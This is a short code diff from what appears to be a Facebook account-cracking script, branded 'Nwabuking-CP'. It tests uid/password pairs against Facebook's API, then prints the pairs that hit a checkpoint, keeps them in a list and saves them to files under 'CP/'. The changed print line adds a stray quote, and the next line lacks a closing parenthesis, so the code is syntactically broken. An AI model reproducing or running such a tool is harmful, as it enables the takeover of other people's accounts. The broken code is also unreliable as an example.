@@ -317,7 +317,7 @@ def bapi(user):
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[\033[1;91mNwabuking-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw))
+				print("\r\033[1;97m[\033[1;91mNwabuking-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw)")
 				cp.append("%s | %s"%(uid, pw)
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s | %s\n"%(uid, pw))
 				break
